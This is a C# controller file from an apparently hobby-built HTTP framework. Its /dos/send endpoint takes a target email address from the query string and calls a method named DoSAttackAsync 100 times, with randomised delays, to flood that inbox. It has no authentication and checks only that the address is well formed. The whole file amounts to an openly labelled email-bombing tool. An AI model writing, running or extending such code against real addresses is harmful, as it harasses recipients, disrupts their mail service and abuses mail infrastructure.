using System.Net;
using System.Text.RegularExpressions;
using MyFirstHttp.Framework.Abstractions;
using MyFirstHttp.Framework.Attributes;
using MyFirstHttp.Framework.Results;
using MyFirstHttp.Framework.Utilities;

namespace MyFirstHttp.Framework.Controllers;

[Controller("dos")]
public class DosController : ControllerBase
{
    private static readonly EmailService _emailService = new EmailService();
    
    [HttpGet("send")]
    public async Task<IActionResult> SendMessage()
    {
        string toEmail = Query["to"];
        
        if (string.IsNullOrEmpty(toEmail))
        {
            return Text("Invalid email data", HttpStatusCode.BadRequest);
        }

        if (!IsValidEmail(toEmail))
        {
            return Text("Invalid email format", HttpStatusCode.BadRequest);
        }
        
        int totalEmails = 100;
        int successCount = 0;
        var random = new Random();
        
        for (int i = 1; i <= totalEmails; i++)
        {

            try
            {
                bool sent = await _emailService.DoSAttackAsync(toEmail, i, totalEmails);
                if (sent) successCount++;
            
                int delay = random.Next(300, 700);
                await Task.Delay(delay);

                Console.WriteLine($"[DosController] Total sent {successCount}/{totalEmails} messages");
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                throw;
            }
        }
        
        return new TextResult($"[DosController] Sent ALL {successCount}/{totalEmails} messages", HttpStatusCode.OK);
    }
    
    bool IsValidEmail(string email)
    {
        try
        {
            var address = new System.Net.Mail.MailAddress(email);
            return address.Address == email;
        }
        catch (Exception ex)
        {
            return false;
        }
    }
}